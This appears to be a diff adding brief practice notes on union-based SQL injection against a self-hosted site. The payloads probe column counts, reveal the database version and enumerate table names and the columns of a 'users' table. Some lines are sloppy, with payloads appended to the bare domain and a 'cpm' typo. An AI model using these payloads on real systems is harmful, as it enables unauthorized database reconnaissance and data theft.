@@ -1,1 +1,14 @@
+1) Host a website/web application (url say: example.com)
 
+2) In the search tab of browser type the following and press enter:
+> example.com order by 1 
+> example.com order by 2
+> example.com order by 3
+> example.com order by 4 [//Until we get error]
+------
+> example.cpm union select 1,2,3,4 [ //column with vulnerability is known.]
+------Say column 2 is vulnerable---------
+> example.cpm union select 1,@@version,3,4 [ //column2 will give version ]
+> example.com union select 1, table_name,3,4 from information_schema.tables [// ytable displayed]
+> example.com union select 1, column_name,3,4 from information_schema.columns where table_name="users" [// column names displayed of table "users"]
+> 
